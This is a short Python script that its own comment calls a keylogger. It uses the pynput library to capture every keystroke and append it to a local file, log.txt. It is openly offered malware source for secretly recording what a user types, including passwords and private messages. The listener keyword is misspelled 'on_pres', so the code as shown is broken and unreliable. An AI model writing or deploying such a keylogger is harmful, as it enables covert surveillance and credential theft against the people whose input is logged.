from pynput.keyboard import Listener

def writeToFile(key):
    keydata = str(key)
    keydata = keydata.replace("'", "")
    with open("log.txt", "a") as f:
        f.write(keydata)

#this function is the keyLogger...

with Listener(on_pres=writeToFile) as l:
    l.join()